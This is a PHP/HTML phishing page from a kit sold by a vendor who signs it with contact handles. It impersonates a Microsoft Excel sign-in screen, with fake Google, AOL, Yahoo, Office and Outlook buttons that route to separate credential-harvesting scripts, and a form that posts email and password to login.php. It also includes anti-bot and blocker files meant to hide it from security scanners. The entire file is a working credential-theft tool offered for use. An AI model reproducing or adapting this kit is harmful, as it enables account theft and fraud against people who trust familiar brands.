<?php
// THIS SCRIPT CODED BY TOPFUD.com
// Skype : TOPFUD@hotmail.com ,, live:.cid.f3ca894e49395bbe
// ICQ : 624088694
// You can visit our shop we are online 24 hrs 
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

include('blocker.php');
include('antibots.php');
include('block.php');
include('bots.php');
include('bt.php');

?>
<!DOCTYPE html><html class=''>
<head>
    <title>Excel | Login</title>
<link href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<link rel='stylesheet prefetch' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
<link rel="stylesheet" type="text/css" href="assets/style.css">
</head>
<body>
<!-- LOGIN MODULE -->
<div class="login">
    <div class="wrap">
        <!-- TOGGLE -->
        <div id="toggle-wrap">
            <div id="toggle-terms">
                <div id="cross">
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>

        <!-- SLIDER -->
        <div class="content">
            <!-- LOGO -->
            <div class="logo">
                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Microsoft_Excel_2013_logo.svg/1200px-Microsoft_Excel_2013_logo.svg.png" alt=""></a>
            </div>
            <!-- SLIDESHOW -->
            <div id="slideshow">
                <div class="one">
                    <h2><span>Excel</span></h2>
                    <p>The Excel spreadsheet app lets you create, view, edit, and share your files with others quickly and easily</p>
                </div>
            </div>
        </div>
        <!-- LOGIN FORM -->
        <div class="user">
            <!-- ACTIONS
            <div class="actions">
                <a class="help" href="#signup-tab-content">Sign Up</a><a class="faq" href="#login-tab-content">Login</a>
            </div>
            -->
            <section class="EmailPage__social-signin" style="padding: 90px; padding-bottom: 0px">
              <a id="google" href="inc/gm.php" data-id="EmailPage-GoogleSignInButton" role="button" tabindex="0" class="spectrum-ActionButton SocialButton SocialButton--google">
                  <svg viewBox="0 0 1152 1152" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeS SocialButton-Icon">
                      <path d="M1055.994 594.42a559.973 559.973 0 0 0-8.86-99.684h-458.99V683.25h262.28c-11.298 60.918-45.633 112.532-97.248 147.089v122.279h157.501c92.152-84.842 145.317-209.78 145.317-358.198z" fill="#4285f4"></path>
                      <path d="M588.144 1070.688c131.583 0 241.9-43.64 322.533-118.07l-157.5-122.28c-43.64 29.241-99.463 46.52-165.033 46.52-126.931 0-234.368-85.728-272.691-200.919H152.636v126.267c80.19 159.273 245 268.482 435.508 268.482z" fill="#34a853"></path>
                      <path d="M315.453 675.94a288.113 288.113 0 0 1 0-185.191V364.482H152.636a487.96 487.96 0 0 0 0 437.724z" fill="#fbbc05"></path>
                      <path d="M588.144 289.83c71.551 0 135.792 24.589 186.298 72.88l139.78-139.779C829.821 144.291 719.504 96 588.143 96c-190.507 0-355.318 109.21-435.508 268.482L315.453 490.75c38.323-115.19 145.76-200.919 272.691-200.919z" fill="#ea4335"></path>
                  </svg><span class="spectrum-ActionButton-label">Continue with Google</span></a>

              <a id="aol" href="inc/ao.php" data-id="EmailPage-AppleSignInButton" role="button" tabindex="0" class="spectrum-ActionButton SocialButton SocialButton--apple">
                  <img style="width: 20px" src="https://cdn1.iconfinder.com/data/icons/social-black-buttons/512/aol-512.png"><span class="spectrum-ActionButton-label">Continue with AOL</span></a>
              <a id="yahoo" href="inc/ya.php" style="background-color: #83358b; border: none"  data-id="EmailPage-AppleSignInButton" role="button" tabindex="0" class="spectrum-ActionButton SocialButton SocialButton--apple">
                 <img style="width: 20px" src="https://i2.wp.com/www.vectorico.com/wp-content/uploads/2018/02/Yahoo-Icon.png?resize=300%2C300">
                 <span class="spectrum-ActionButton-label">Continue with Yahoo</span></a>
                     <a id="adobe" href="inc/off.php" style="background-color: #e44919; border: none"  data-id="EmailPage-AppleSignInButton" role="button" tabindex="0" class="spectrum-ActionButton SocialButton SocialButton--apple">
                 <img style="width: 20px" src="https://toppng.com/public/uploads/thumbnail//white-icon-office-365-microsoft-office-icon-white-11553435336i4t0xosmzy.png">
                 <span class="spectrum-ActionButton-label">Continue with office</span></a>
                  <a id="outlook" href="inc/hot.php" style="background-color: #0072c6; border: none"  data-id="EmailPage-AppleSignInButton" role="button" tabindex="0" class="spectrum-ActionButton SocialButton SocialButton--apple">
                 <img style="width: 20px" src="https://icons-for-free.com/iconfiles/png/512/mail+microsoft+outlook+icon-1320086786273490891.png">
                 <span class="spectrum-ActionButton-label">Continue with Outlook</span></a>
                 <a id="other" href="#" style="background-color: grey; border: none"  data-id="EmailPage-AppleSignInButton" role="button" tabindex="0" class="spectrum-ActionButton SocialButton SocialButton--apple">
                 <img style="width: 20px" src="">
                 <span class="spectrum-ActionButton-label">Continue with Other</span></a>
                        </section>
            <div class="form-wrap login-form" style="display: none">
                <!-- TABS -->
                <div class="tabs">
                    <h3 class="login-tab"><a class="log-in active" href="#login-tab-content"><span>Login<span></a></h3>
                </div>

                <!-- TABS CONTENT -->
                <div class="tabs-content">
                    <!-- TABS CONTENT LOGIN -->
                    <div id="login-tab-content" class="active">

                        <form class="" action="login.php" method="post" >
                            <input type="email"  name="user" class="input" id="email" autocomplete="off" placeholder="Email or Username" required="">
                            <input type="password"  name="pass" class="input" id="user_pass" autocomplete="off" placeholder="Password" required="">
                            <input type="checkbox" class="checkbox" checked id="remember_me">
                            <label for="remember_me">Remember me</label>
                            <input type="submit" class="button" value="Login">
                        </form>
                    </div>

                </div>
            </div>
        </div>
    </div>
</div>
</body>
    <script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <script type="text/javascript">
     $('#other').click(function(){
        $('.login-form').show(200)
        $('.EmailPage__social-signin').hide(200)
    })
</script>
</html>
